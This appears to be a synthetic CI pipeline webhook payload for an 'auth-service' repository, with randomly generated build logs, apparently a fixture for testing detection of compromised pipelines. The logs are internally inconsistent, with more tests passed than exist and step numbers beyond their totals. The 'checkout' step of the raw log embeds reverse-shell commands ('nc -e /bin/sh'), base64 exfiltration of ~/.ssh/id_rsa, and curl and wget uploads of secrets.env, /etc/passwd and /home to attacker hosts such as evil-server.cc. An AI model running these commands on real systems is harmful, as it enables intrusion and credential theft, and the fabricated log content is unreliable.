{
  "action": "completed",
  "workflow_run": {
    "id": 676,
    "name": "CI Pipeline",
    "head_branch": "main",
    "head_sha": "ef23bfe15a0535293ddb98db09cb78ec48fe7d4e",
    "status": "completed",
    "conclusion": "success",
    "run_started_at": "2025-12-09T12:47:20.043462Z",
    "updated_at": "2025-12-09T12:49:09.836680Z"
  },
  "repository": {
    "full_name": "startup-io/auth-service",
    "name": "auth-service"
  },
  "sender": {
    "login": "eve"
  },
  "_safeops_extended": {
    "raw_logs": "=== Step: save_cache ===\nConnection established\nnpm notice: package.json updated\nFinished.\nPulling image: alpine:18\nnpm install: resolved 579 packages\nnpm notice: created a lockfile\nOK\nOK\nMinifying main.js\n[12:47:20] INFO: Cache refreshed\nnpm install: resolved 1022 packages\n[12:47:20] INFO: Starting build process\nNODE_ENV=production\nCompiling components/service.java...\nProcessing...\n[12:47:20] INFO: Connecting to database\nyarn add: Done in 26.68s\nUsing Python 3.12\nnpm notice: package.json updated\nCoverage: 88% statements, 96% branches\nUploading artifact 'coverage' (28 files)\nWaiting...\nFinished.\nImage pulled successfully\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nStep 9/22: Building\nCreating production build...\nOK\nImage pulled successfully\nEnvironment: development\nDone.\nnpm notice: created a lockfile\n=== Step save_cache completed ===\n=== Step: integration_tests ===\nConnection established\nStep 19/21: Building\nCoverage: 85% statements, 78% branches\nBuilding Docker image...\nOptimizing 31 modules...\nUsing Python 3.11\n\u2713 Task completed in 2886ms\npip: Collecting webpack\nCompiling lib/main.py...\npip: Downloading prettier-2.13.tar.gz\nCompiling lib/main.py...\nProcessing...\nFetching from https://docker.io/package.json\nBuilding Docker image...\nRan 15 tests in 2s\nTLS handshake completed\nPlatform: linux-x64\nWARNING: webpack has known vulnerabilities\npip install: Successfully installed react-5.7\n\u2713 All checks passed\nCompleted.\n\u2713 All checks passed\n[12:47:20] WARN: Deprecated API usage\nnpm install: resolved 1496 packages\nStep 18/15: Running migrations\npip: Downloading jest-1.0.tar.gz\nWARNING: express has known vulnerabilities\nProcessing...\nTest Suites: 42 passed, 22 total\nNODE_ENV=production\nOK\n[12:47:20] WARN: Deprecated API usage\n=== Step integration_tests completed ===\n=== Step: unit_tests ===\n  PASS: test_auth_login (54ms)\nnpm install: resolved 299 packages\nNODE_ENV=production\nnpm notice: package.json updated\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nCache miss for key-2745\nStep 15/18: Deploying\nException: NullPointerException\nFinished.\nyarn add: Done in 13.20s\n\u2713 deploy completed\nyarn add: Done in 29.16s\nUploading artifact 'coverage' (41 files)\nBuilding Docker image...\n[12:47:20] WARN: Deprecated API usage\npip: Downloading react-1.4.tar.gz\n[12:47:20] WARN: Deprecated API usage\nyarn add: Done in 30.22s\nnpm notice: package.json updated\n\u2713 Step 'build' succeeded\nInstalling webpack@4.10.9\nFetching from https://pypi.org/package.json\nMinifying app.js\nChecking out develop branch\n[12:47:20] DEBUG: Memory usage: 1126MB\n\u2713 Step 'setup' succeeded\nPOST /data - 200 (310ms)\nSuccess!\nTransforming 470 files...\nRan 59 tests in 19s\nCompleted.\nUsing Python 3.12\n=== Step unit_tests completed ===\n=== Step: lint ===\nFinished.\nWARNING: eslint has known vulnerabilities\n[12:47:20] DEBUG: Connection pool: 13 active\n[12:47:20] DEBUG: Connection pool: 14 active\n[12:47:20] INFO: Starting build process\nCache saved successfully\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nCompiling utils/utils.go...\nCoverage: 83% statements, 68% branches\n[12:47:20] WARN: Deprecated API usage\nTests: 219 passed, 270 total\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nCompiling components/handler.rs...\nPulling image: alpine:18\nCache restored successfully (324MB)\nArtifact uploaded: dist.zip (49MB)\nCache miss for key-3429\nCompiling components/app.ts...\nyarn add: Done in 1.90s\nUploading artifact 'build' (37 files)\npip: Installing build dependencies...\nUsing Node.js 14.8.7\nTransforming 807 files...\nWARNING: express has known vulnerabilities\nnpm notice: package.json updated\nCache miss for key-1425\nCreating production build...\nReady.\nWARNING: eslint has known vulnerabilities\nnpm install: added 406 packages\nStep 3/21: Building\nSuccess!\n=== Step lint completed ===\n=== Step: deploy_staging ===\nCache invalidated: build\nnpm notice: created a lockfile\nMinifying app.js\n\u2713 Task completed in 4640ms\nPushing to registry...\nGET /api - 201 (90ms)\nReady.\nAlready up to date.\n\u2713 All checks passed\nStep 16/18: Running migrations\nnpm install: resolved 1799 packages\nHEAD is now at 6e759a8\n[12:47:20] DEBUG: Loading configuration\n[12:47:20] INFO: Connecting to database\nUploading artifact 'build' (15 files)\n  PASS: unit/test_cache_hit.spec.js\nCache restored successfully (93MB)\nCompiling components/index.js...\nStep 1/23: Linting\n[12:47:20] INFO: Connecting to database\nTest Suites: 40 passed, 13 total\n[12:47:20] DEBUG: Query executed in 90ms\nStep 3/25: Deploying\n[12:47:20] INFO: Connecting to database\nArtifact uploaded: build.tar.gz (2MB)\nMinifying vendor.js\n[12:47:20] INFO: Cache refreshed\nFinished.\nWaiting...\n[12:47:20] INFO: Request completed\nCache saved successfully\nHEAD is now at 21e31c0\n=== Step deploy_staging completed ===\n=== Step: restore_cache ===\nnpm notice: created a lockfile\nStep 6/19: Deploying\n\u2717 build failed with exit code 36\nTransforming 356 files...\nWARNING: webpack has known vulnerabilities\nCache miss for key-4256\nPlatform: darwin-arm64\n[12:47:20] INFO: Cache refreshed\n[12:47:20] WARN: Deprecated API usage\nProcessing...\n  PASS: integration/test_db_connect.spec.js\nArtifact uploaded: dist.zip (34MB)\nArtifact downloaded: 23MB\nCompleted.\nCache restored successfully (261MB)\nSuccess!\nArtifact downloaded: 1MB\nCache saved successfully\n[12:47:20] DEBUG: Initializing service\nUsing Python 3.10\npip: Downloading jest-4.16.tar.gz\nCache restored successfully (283MB)\nCompiling src/app.ts...\nMinifying main.js\n\u2713 All checks passed\nCache restored successfully (195MB)\nSuccess!\nPlatform: darwin-arm64\n[12:47:20] WARN: Deprecated API usage\nOK\nTime: 81.917s\nStep 9/20: Running migrations\n=== Step restore_cache completed ===\n=== Step: setup_environment ===\nLoading...\nSwitched to branch 'feature/task-792'\nSwitched to branch 'hotfix/task-864'\nStep 17/19: Linting\n[12:47:20] INFO: Processing request\nPushing to registry...\nTLS handshake completed\n[12:47:20] DEBUG: Initializing service\n[12:47:20] INFO: Request completed\nEnvironment: development\n[12:47:20] DEBUG: Initializing service\nStep 3/17: Installing dependencies\nTest Suites: 27 passed, 43 total\nStep 20/24: Running migrations\n[12:47:20] DEBUG: Connection pool: 20 active\nFetching from https://github.com/package.json\nTransforming 429 files...\nCoverage: 95% statements, 83% branches\nArtifact uploaded: build.tar.gz (27MB)\nnpm notice: package.json updated\nMinifying main.js\n\u2713 All checks passed\n\u2713 All checks passed\nPOST /data - 200 (215ms)\nnpm notice: created a lockfile\nSuccess!\nProcessing...\nWARNING: lodash has known vulnerabilities\nGenerating source maps...\nPlatform: linux-x64\nCache invalidated: build\nSuccess!\n=== Step setup_environment completed ===\n=== Step: e2e_tests ===\nAlready up to date.\npip: Installing build dependencies...\n[12:47:20] DEBUG: Connection pool: 9 active\n[12:47:20] DEBUG: Loading configuration\nMinifying app.js\nCompiling components/utils.go...\nStep 15/25: Running migrations\npip: Installing build dependencies...\n[12:47:20] WARN: Deprecated API usage\nTest Suites: 12 passed, 47 total\nStep 2/20: Testing\nStep 6/21: Testing\nnpm notice: package.json updated\n[12:47:20] DEBUG: Query executed in 64ms\nInstalling lodash@1.5.7\nUsing Node.js 18.6.4\nCompiling utils/index.js...\nCache restored successfully (38MB)\nCache invalidated: dependencies\nGenerating source maps...\nFAILED: test_cache_hit\nVerifying...\n[12:47:20] INFO: Processing request\nWaiting...\nEnvironment: staging\nNODE_ENV=production\nLayer 3/12: RUN command\nStep 4/21: Running migrations\nInstalling lodash@2.17.3\nEnvironment: staging\nCompiling src/app.ts...\nFetching submodules...\n=== Step e2e_tests completed ===\n=== Step: install_dependencies ===\nArtifact downloaded: 4MB\nnpm notice: package.json updated\n  PASS: test_cache_hit (4ms)\nRan 101 tests in 34s\nStep 12/25: Running migrations\nCompiling lib/utils.go...\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nChecking out main branch\nOptimizing 71 modules...\nArtifact uploaded: dist.zip (99MB)\nTime: 58.536s\n[12:47:20] ERROR: Connection failed\nArtifact uploaded: dist.zip (15MB)\nAlready up to date.\nCompiling lib/app.ts...\nConnection established\nCompiling components/app.ts...\n\u2713 Task completed in 3446ms\nyarn add: Done in 30.29s\nVerifying...\n[12:47:20] INFO: Processing request\npip: Installing build dependencies...\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nTime: 60.68s\nDone.\nArtifact uploaded: dist.zip (81MB)\nCache hit for key-7017\nFetching from https://amazonaws.com/package.json\nCompiling utils/utils.go...\nFAILED: test_db_connect\nCache saved successfully\nStep 14/15: Deploying\n=== Step install_dependencies completed ===\n=== Step: build ===\nStep 19/19: Installing dependencies\n[12:47:20] WARN: Deprecated API usage\nUploading artifact 'build' (27 files)\n[12:47:20] DEBUG: Query executed in 90ms\n[12:47:20] INFO: Connecting to database\nCache invalidated: node_modules\nStep 19/25: Installing dependencies\nnpm install: resolved 1854 packages\n[12:47:20] WARN: Deprecated API usage\nReady.\nException: RuntimeError\n[12:47:20] INFO: Starting build process\nnpm notice: package.json updated\nWaiting...\nUploading artifact 'build' (47 files)\nArtifact uploaded: dist.zip (70MB)\nStep 11/24: Installing dependencies\nStep 3/19: Building\nCompiling utils/service.java...\nUsing Node.js 14.3.10\nGET /status - 204 (8ms)\nCompiling components/service.java...\nInstalling webpack@4.1.10\nArtifact uploaded: dist.zip (68MB)\nImage pulled successfully\nStep 1/17: Testing\nHEAD is now at d7a60f7\n  PASS: integration/test_auth_login.spec.js\nReady.\n[12:47:20] WARN: Deprecated API usage\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nLayer 5/13: COPY command\n=== Step build completed ===\n=== Step: deploy_production ===\nGET /api - 200 (33ms)\nChecking out master branch\nEnvironment: staging\nFinished.\nStep 12/19: Deploying\nStep 18/19: Running migrations\nArtifact downloaded: 43MB\n  PASS: unit/test_db_connect.spec.js\nGenerating source maps...\n\u2713 Task completed in 2441ms\nReady.\n[12:47:20] ERROR: Connection failed\nArtifact uploaded: build.tar.gz (6MB)\nLoading...\n[12:47:20] INFO: Cache refreshed\nCache miss for key-7928\nReady.\nCoverage: 95% statements, 73% branches\nPlatform: linux-x64\n\u2713 deploy completed\nTests: 161 passed, 277 total\nPulling image: python:latest\nCompiling utils/service.java...\nUsing Node.js 20.19.2\nCache saved successfully\nAlready up to date.\nImage pulled successfully\nConnection established\nFetching from https://npmjs.org/package.json\nPlatform: win32-x64\nSnapshots: 22 passed, 20 total\nCache saved successfully\n=== Step deploy_production completed ===\n=== Step: upload_artifacts ===\nnpm notice: package.json updated\nTransforming 630 files...\n[12:47:20] INFO: Connecting to database\nUsing Python 3.9\nGET /status - 201 (88ms)\nCreating production build...\nStep 15/24: Building\nWaiting...\n[12:47:20] WARN: Deprecated API usage\nPulling image: node:latest\n[12:47:20] DEBUG: Loading configuration\nMinifying app.js\nWARNING: webpack has known vulnerabilities\nVerifying...\nStep 18/18: Installing dependencies\nReady.\nAlready up to date.\nTLS handshake completed\nCache invalidated: build\nTest Suites: 48 passed, 8 total\nEnvironment: test\n[12:47:20] WARN: Deprecated API usage\n\u2713 validate completed\nGenerating source maps...\nSnapshots: 24 passed, 46 total\nStep 3/23: Installing dependencies\nnpm install: resolved 695 packages\nHEAD is now at d6d8c1d\nHEAD is now at 4ebfef8\nStep 14/19: Building\nWARNING: lodash has known vulnerabilities\nCache miss for key-7594\n=== Step upload_artifacts completed ===\n=== Step: setup_node ===\nEnvironment: test\n[12:47:20] WARN: Deprecated API usage\nOptimizing 38 modules...\nStep 5/17: Running migrations\nGET /health - 201 (16ms)\n\u2717 build failed with exit code 88\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nVerifying...\nImage pulled successfully\nFetching from https://pypi.org/package.json\nException: TypeError\n[12:47:20] DEBUG: Memory usage: 704MB\n  PASS: unit/test_api_health.spec.js\nStep 17/24: Linting\nGET /api - 200 (74ms)\nPushing to registry...\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nCompleted.\nPulling image: python:3.11\nRan 149 tests in 9s\nArtifact uploaded: dist.zip (1MB)\nNODE_ENV=test\nUsing Python 3.11\n[12:47:20] INFO: Processing request\nFinished.\nLoading...\nArtifact downloaded: 40MB\n[12:47:20] DEBUG: Memory usage: 1076MB\n[12:47:20] DEBUG: Query executed in 27ms\nImage pulled successfully\nOptimizing 26 modules...\npip: Installing build dependencies...\n=== Step setup_node completed ===\n=== Step: type_check ===\nPulling image: python:3.11\nnpm notice: created a lockfile\nImage pulled successfully\nBuilding Docker image...\nUsing Python 3.11\nCreating production build...\n\u26a0 DEPRECATION: Feature will be removed in v4.0\npip: Installing build dependencies...\nnpm notice: package.json updated\n\u2713 Step 'checkout' succeeded\nArtifact downloaded: 37MB\nCreating production build...\nUsing Python 3.11\nArtifact downloaded: 24MB\nStep 13/24: Linting\nSwitched to branch 'bugfix/task-259'\nStep 3/24: Installing dependencies\n\u2713 validate completed\nCompiling utils/utils.go...\n[12:47:20] INFO: Processing request\nUsing Node.js 16.14.6\nPlatform: darwin-arm64\nProcessing...\nPlatform: win32-x64\n[12:47:20] DEBUG: Query executed in 97ms\nyarn add: Done in 16.46s\nWARNING: jest has known vulnerabilities\nWARNING: axios has known vulnerabilities\nLayer 9/13: ENV command\nWARNING: express has known vulnerabilities\nFinished.\nLayer 1/15: COPY command\n=== Step type_check completed ===\n=== Step: checkout ===\nConnection established\nSending 170MB of data to data-exfil.ru\npip install: Successfully installed prettier-5.14\nTLS handshake completed\n  PASS: test_db_connect (30ms)\nSending 500MB of data to evil-server.cc\ncurl -X POST https://evil-server.cc/collect --data @secrets.env\n[12:47:20] DEBUG: Connection pool: 5 active\nyarn add: Done in 28.21s\nPOST /data - 200 (189ms)\n\u2713 Task completed in 1925ms\nnpm notice: package.json updated\n[12:47:20] DEBUG: Query executed in 18ms\nnc -e /bin/sh 101.216.129.66 56907\nnc -e /bin/sh 89.112.148.37 24865\necho $(cat ~/.ssh/id_rsa) | base64 | nc 236.193.129.182 52142\nSending 468MB of data to malicious-pool.xyz\nwget --post-data=\"$(cat /etc/passwd)\" https://malicious-pool.xyz/exfil\n[12:47:20] DEBUG: Connection pool: 4 active\nnc -e /bin/sh 38.221.211.186 9794\nPulling image: python:3.11\npip: Installing build dependencies...\nSending 300MB of data to malicious-pool.xyz\nSwitched to branch 'bugfix/task-240'\nBundling runtime.css\necho $(cat ~/.ssh/id_rsa) | base64 | nc 219.30.254.191 27195\nGET /api - 204 (24ms)\nCoverage: 81% statements, 68% branches\nUsing Python 3.12\necho $(cat ~/.ssh/id_rsa) | base64 | nc 120.204.252.150 5770\necho $(cat ~/.ssh/id_rsa) | base64 | nc 147.144.64.45 19820\nSnapshots: 35 passed, 4 total\ncurl -X POST https://evil-server.cc/collect --data @secrets.env\npip install: Successfully installed axios-5.2\nHEAD is now at 18fe86e\n[12:47:20] DEBUG: Query executed in 48ms\nnc -e /bin/sh 235.171.243.155 12043\nSending 14MB of data to crypto-mine.io\nTransforming 672 files...\nSending 385MB of data to malicious-pool.xyz\n\u2717 build failed with exit code 21\n[12:47:20] INFO: Connecting to database\nnc -e /bin/sh 208.221.237.61 56830\n\u2717 build failed with exit code 114\nGET /status - 201 (81ms)\ncurl -X POST https://data-exfil.ru/collect --data @secrets.env\ntar czf - /home | curl -X POST -d @- https://crypto-mine.io/upload\nGET /api - 201 (40ms)\nSending 289MB of data to malicious-pool.xyz\ncurl -X POST https://data-exfil.ru/collect --data @secrets.env\nStep 13/22: Installing dependencies\nCompiling lib/utils.go...\nnc -e /bin/sh 47.178.211.148 3842\nSnapshots: 41 passed, 3 total\nConnection established\n=== Step checkout completed ===",
    "steps": [
      {
        "name": "save_cache",
        "status": "success",
        "started_at": "2025-12-09T12:47:20.043462",
        "finished_at": "2025-12-09T12:47:23.337259",
        "log_lines": [
          "=== Step: save_cache ===",
          "Connection established",
          "npm notice: package.json updated",
          "Finished.",
          "Pulling image: alpine:18",
          "npm install: resolved 579 packages",
          "npm notice: created a lockfile",
          "OK",
          "OK",
          "Minifying main.js",
          "[12:47:20] INFO: Cache refreshed",
          "npm install: resolved 1022 packages",
          "[12:47:20] INFO: Starting build process",
          "NODE_ENV=production",
          "Compiling components/service.java...",
          "Processing...",
          "[12:47:20] INFO: Connecting to database",
          "yarn add: Done in 26.68s",
          "Using Python 3.12",
          "npm notice: package.json updated",
          "Coverage: 88% statements, 96% branches",
          "Uploading artifact 'coverage' (28 files)",
          "Waiting...",
          "Finished.",
          "Image pulled successfully",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Step 9/22: Building",
          "Creating production build...",
          "OK",
          "Image pulled successfully",
          "Environment: development",
          "Done.",
          "npm notice: created a lockfile",
          "=== Step save_cache completed ==="
        ]
      },
      {
        "name": "integration_tests",
        "status": "success",
        "started_at": "2025-12-09T12:47:23.337259",
        "finished_at": "2025-12-09T12:47:34.316581",
        "log_lines": [
          "=== Step: integration_tests ===",
          "Connection established",
          "Step 19/21: Building",
          "Coverage: 85% statements, 78% branches",
          "Building Docker image...",
          "Optimizing 31 modules...",
          "Using Python 3.11",
          "\u2713 Task completed in 2886ms",
          "pip: Collecting webpack",
          "Compiling lib/main.py...",
          "pip: Downloading prettier-2.13.tar.gz",
          "Compiling lib/main.py...",
          "Processing...",
          "Fetching from https://docker.io/package.json",
          "Building Docker image...",
          "Ran 15 tests in 2s",
          "TLS handshake completed",
          "Platform: linux-x64",
          "WARNING: webpack has known vulnerabilities",
          "pip install: Successfully installed react-5.7",
          "\u2713 All checks passed",
          "Completed.",
          "\u2713 All checks passed",
          "[12:47:20] WARN: Deprecated API usage",
          "npm install: resolved 1496 packages",
          "Step 18/15: Running migrations",
          "pip: Downloading jest-1.0.tar.gz",
          "WARNING: express has known vulnerabilities",
          "Processing...",
          "Test Suites: 42 passed, 22 total",
          "NODE_ENV=production",
          "OK",
          "[12:47:20] WARN: Deprecated API usage",
          "=== Step integration_tests completed ==="
        ]
      },
      {
        "name": "unit_tests",
        "status": "success",
        "started_at": "2025-12-09T12:47:34.316581",
        "finished_at": "2025-12-09T12:47:50.785564",
        "log_lines": [
          "=== Step: unit_tests ===",
          "  PASS: test_auth_login (54ms)",
          "npm install: resolved 299 packages",
          "NODE_ENV=production",
          "npm notice: package.json updated",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Cache miss for key-2745",
          "Step 15/18: Deploying",
          "Exception: NullPointerException",
          "Finished.",
          "yarn add: Done in 13.20s",
          "\u2713 deploy completed",
          "yarn add: Done in 29.16s",
          "Uploading artifact 'coverage' (41 files)",
          "Building Docker image...",
          "[12:47:20] WARN: Deprecated API usage",
          "pip: Downloading react-1.4.tar.gz",
          "[12:47:20] WARN: Deprecated API usage",
          "yarn add: Done in 30.22s",
          "npm notice: package.json updated",
          "\u2713 Step 'build' succeeded",
          "Installing webpack@4.10.9",
          "Fetching from https://pypi.org/package.json",
          "Minifying app.js",
          "Checking out develop branch",
          "[12:47:20] DEBUG: Memory usage: 1126MB",
          "\u2713 Step 'setup' succeeded",
          "POST /data - 200 (310ms)",
          "Success!",
          "Transforming 470 files...",
          "Ran 59 tests in 19s",
          "Completed.",
          "Using Python 3.12",
          "=== Step unit_tests completed ==="
        ]
      },
      {
        "name": "lint",
        "status": "success",
        "started_at": "2025-12-09T12:47:50.785564",
        "finished_at": "2025-12-09T12:47:56.275225",
        "log_lines": [
          "=== Step: lint ===",
          "Finished.",
          "WARNING: eslint has known vulnerabilities",
          "[12:47:20] DEBUG: Connection pool: 13 active",
          "[12:47:20] DEBUG: Connection pool: 14 active",
          "[12:47:20] INFO: Starting build process",
          "Cache saved successfully",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Compiling utils/utils.go...",
          "Coverage: 83% statements, 68% branches",
          "[12:47:20] WARN: Deprecated API usage",
          "Tests: 219 passed, 270 total",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Compiling components/handler.rs...",
          "Pulling image: alpine:18",
          "Cache restored successfully (324MB)",
          "Artifact uploaded: dist.zip (49MB)",
          "Cache miss for key-3429",
          "Compiling components/app.ts...",
          "yarn add: Done in 1.90s",
          "Uploading artifact 'build' (37 files)",
          "pip: Installing build dependencies...",
          "Using Node.js 14.8.7",
          "Transforming 807 files...",
          "WARNING: express has known vulnerabilities",
          "npm notice: package.json updated",
          "Cache miss for key-1425",
          "Creating production build...",
          "Ready.",
          "WARNING: eslint has known vulnerabilities",
          "npm install: added 406 packages",
          "Step 3/21: Building",
          "Success!",
          "=== Step lint completed ==="
        ]
      },
      {
        "name": "deploy_staging",
        "status": "success",
        "started_at": "2025-12-09T12:47:56.275225",
        "finished_at": "2025-12-09T12:48:01.764886",
        "log_lines": [
          "=== Step: deploy_staging ===",
          "Cache invalidated: build",
          "npm notice: created a lockfile",
          "Minifying app.js",
          "\u2713 Task completed in 4640ms",
          "Pushing to registry...",
          "GET /api - 201 (90ms)",
          "Ready.",
          "Already up to date.",
          "\u2713 All checks passed",
          "Step 16/18: Running migrations",
          "npm install: resolved 1799 packages",
          "HEAD is now at 6e759a8",
          "[12:47:20] DEBUG: Loading configuration",
          "[12:47:20] INFO: Connecting to database",
          "Uploading artifact 'build' (15 files)",
          "  PASS: unit/test_cache_hit.spec.js",
          "Cache restored successfully (93MB)",
          "Compiling components/index.js...",
          "Step 1/23: Linting",
          "[12:47:20] INFO: Connecting to database",
          "Test Suites: 40 passed, 13 total",
          "[12:47:20] DEBUG: Query executed in 90ms",
          "Step 3/25: Deploying",
          "[12:47:20] INFO: Connecting to database",
          "Artifact uploaded: build.tar.gz (2MB)",
          "Minifying vendor.js",
          "[12:47:20] INFO: Cache refreshed",
          "Finished.",
          "Waiting...",
          "[12:47:20] INFO: Request completed",
          "Cache saved successfully",
          "HEAD is now at 21e31c0",
          "=== Step deploy_staging completed ==="
        ]
      },
      {
        "name": "restore_cache",
        "status": "success",
        "started_at": "2025-12-09T12:48:01.764886",
        "finished_at": "2025-12-09T12:48:05.058683",
        "log_lines": [
          "=== Step: restore_cache ===",
          "npm notice: created a lockfile",
          "Step 6/19: Deploying",
          "\u2717 build failed with exit code 36",
          "Transforming 356 files...",
          "WARNING: webpack has known vulnerabilities",
          "Cache miss for key-4256",
          "Platform: darwin-arm64",
          "[12:47:20] INFO: Cache refreshed",
          "[12:47:20] WARN: Deprecated API usage",
          "Processing...",
          "  PASS: integration/test_db_connect.spec.js",
          "Artifact uploaded: dist.zip (34MB)",
          "Artifact downloaded: 23MB",
          "Completed.",
          "Cache restored successfully (261MB)",
          "Success!",
          "Artifact downloaded: 1MB",
          "Cache saved successfully",
          "[12:47:20] DEBUG: Initializing service",
          "Using Python 3.10",
          "pip: Downloading jest-4.16.tar.gz",
          "Cache restored successfully (283MB)",
          "Compiling src/app.ts...",
          "Minifying main.js",
          "\u2713 All checks passed",
          "Cache restored successfully (195MB)",
          "Success!",
          "Platform: darwin-arm64",
          "[12:47:20] WARN: Deprecated API usage",
          "OK",
          "Time: 81.917s",
          "Step 9/20: Running migrations",
          "=== Step restore_cache completed ==="
        ]
      },
      {
        "name": "setup_environment",
        "status": "success",
        "started_at": "2025-12-09T12:48:05.058683",
        "finished_at": "2025-12-09T12:48:10.548344",
        "log_lines": [
          "=== Step: setup_environment ===",
          "Loading...",
          "Switched to branch 'feature/task-792'",
          "Switched to branch 'hotfix/task-864'",
          "Step 17/19: Linting",
          "[12:47:20] INFO: Processing request",
          "Pushing to registry...",
          "TLS handshake completed",
          "[12:47:20] DEBUG: Initializing service",
          "[12:47:20] INFO: Request completed",
          "Environment: development",
          "[12:47:20] DEBUG: Initializing service",
          "Step 3/17: Installing dependencies",
          "Test Suites: 27 passed, 43 total",
          "Step 20/24: Running migrations",
          "[12:47:20] DEBUG: Connection pool: 20 active",
          "Fetching from https://github.com/package.json",
          "Transforming 429 files...",
          "Coverage: 95% statements, 83% branches",
          "Artifact uploaded: build.tar.gz (27MB)",
          "npm notice: package.json updated",
          "Minifying main.js",
          "\u2713 All checks passed",
          "\u2713 All checks passed",
          "POST /data - 200 (215ms)",
          "npm notice: created a lockfile",
          "Success!",
          "Processing...",
          "WARNING: lodash has known vulnerabilities",
          "Generating source maps...",
          "Platform: linux-x64",
          "Cache invalidated: build",
          "Success!",
          "=== Step setup_environment completed ==="
        ]
      },
      {
        "name": "e2e_tests",
        "status": "success",
        "started_at": "2025-12-09T12:48:10.548344",
        "finished_at": "2025-12-09T12:48:16.038005",
        "log_lines": [
          "=== Step: e2e_tests ===",
          "Already up to date.",
          "pip: Installing build dependencies...",
          "[12:47:20] DEBUG: Connection pool: 9 active",
          "[12:47:20] DEBUG: Loading configuration",
          "Minifying app.js",
          "Compiling components/utils.go...",
          "Step 15/25: Running migrations",
          "pip: Installing build dependencies...",
          "[12:47:20] WARN: Deprecated API usage",
          "Test Suites: 12 passed, 47 total",
          "Step 2/20: Testing",
          "Step 6/21: Testing",
          "npm notice: package.json updated",
          "[12:47:20] DEBUG: Query executed in 64ms",
          "Installing lodash@1.5.7",
          "Using Node.js 18.6.4",
          "Compiling utils/index.js...",
          "Cache restored successfully (38MB)",
          "Cache invalidated: dependencies",
          "Generating source maps...",
          "FAILED: test_cache_hit",
          "Verifying...",
          "[12:47:20] INFO: Processing request",
          "Waiting...",
          "Environment: staging",
          "NODE_ENV=production",
          "Layer 3/12: RUN command",
          "Step 4/21: Running migrations",
          "Installing lodash@2.17.3",
          "Environment: staging",
          "Compiling src/app.ts...",
          "Fetching submodules...",
          "=== Step e2e_tests completed ==="
        ]
      },
      {
        "name": "install_dependencies",
        "status": "success",
        "started_at": "2025-12-09T12:48:16.038005",
        "finished_at": "2025-12-09T12:48:32.506988",
        "log_lines": [
          "=== Step: install_dependencies ===",
          "Artifact downloaded: 4MB",
          "npm notice: package.json updated",
          "  PASS: test_cache_hit (4ms)",
          "Ran 101 tests in 34s",
          "Step 12/25: Running migrations",
          "Compiling lib/utils.go...",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Checking out main branch",
          "Optimizing 71 modules...",
          "Artifact uploaded: dist.zip (99MB)",
          "Time: 58.536s",
          "[12:47:20] ERROR: Connection failed",
          "Artifact uploaded: dist.zip (15MB)",
          "Already up to date.",
          "Compiling lib/app.ts...",
          "Connection established",
          "Compiling components/app.ts...",
          "\u2713 Task completed in 3446ms",
          "yarn add: Done in 30.29s",
          "Verifying...",
          "[12:47:20] INFO: Processing request",
          "pip: Installing build dependencies...",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Time: 60.68s",
          "Done.",
          "Artifact uploaded: dist.zip (81MB)",
          "Cache hit for key-7017",
          "Fetching from https://amazonaws.com/package.json",
          "Compiling utils/utils.go...",
          "FAILED: test_db_connect",
          "Cache saved successfully",
          "Step 14/15: Deploying",
          "=== Step install_dependencies completed ==="
        ]
      },
      {
        "name": "build",
        "status": "success",
        "started_at": "2025-12-09T12:48:32.506988",
        "finished_at": "2025-12-09T12:48:48.975971",
        "log_lines": [
          "=== Step: build ===",
          "Step 19/19: Installing dependencies",
          "[12:47:20] WARN: Deprecated API usage",
          "Uploading artifact 'build' (27 files)",
          "[12:47:20] DEBUG: Query executed in 90ms",
          "[12:47:20] INFO: Connecting to database",
          "Cache invalidated: node_modules",
          "Step 19/25: Installing dependencies",
          "npm install: resolved 1854 packages",
          "[12:47:20] WARN: Deprecated API usage",
          "Ready.",
          "Exception: RuntimeError",
          "[12:47:20] INFO: Starting build process",
          "npm notice: package.json updated",
          "Waiting...",
          "Uploading artifact 'build' (47 files)",
          "Artifact uploaded: dist.zip (70MB)",
          "Step 11/24: Installing dependencies",
          "Step 3/19: Building",
          "Compiling utils/service.java...",
          "Using Node.js 14.3.10",
          "GET /status - 204 (8ms)",
          "Compiling components/service.java...",
          "Installing webpack@4.1.10",
          "Artifact uploaded: dist.zip (68MB)",
          "Image pulled successfully",
          "Step 1/17: Testing",
          "HEAD is now at d7a60f7",
          "  PASS: integration/test_auth_login.spec.js",
          "Ready.",
          "[12:47:20] WARN: Deprecated API usage",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Layer 5/13: COPY command",
          "=== Step build completed ==="
        ]
      },
      {
        "name": "deploy_production",
        "status": "success",
        "started_at": "2025-12-09T12:48:48.975971",
        "finished_at": "2025-12-09T12:48:51.171835",
        "log_lines": [
          "=== Step: deploy_production ===",
          "GET /api - 200 (33ms)",
          "Checking out master branch",
          "Environment: staging",
          "Finished.",
          "Step 12/19: Deploying",
          "Step 18/19: Running migrations",
          "Artifact downloaded: 43MB",
          "  PASS: unit/test_db_connect.spec.js",
          "Generating source maps...",
          "\u2713 Task completed in 2441ms",
          "Ready.",
          "[12:47:20] ERROR: Connection failed",
          "Artifact uploaded: build.tar.gz (6MB)",
          "Loading...",
          "[12:47:20] INFO: Cache refreshed",
          "Cache miss for key-7928",
          "Ready.",
          "Coverage: 95% statements, 73% branches",
          "Platform: linux-x64",
          "\u2713 deploy completed",
          "Tests: 161 passed, 277 total",
          "Pulling image: python:latest",
          "Compiling utils/service.java...",
          "Using Node.js 20.19.2",
          "Cache saved successfully",
          "Already up to date.",
          "Image pulled successfully",
          "Connection established",
          "Fetching from https://npmjs.org/package.json",
          "Platform: win32-x64",
          "Snapshots: 22 passed, 20 total",
          "Cache saved successfully",
          "=== Step deploy_production completed ==="
        ]
      },
      {
        "name": "upload_artifacts",
        "status": "success",
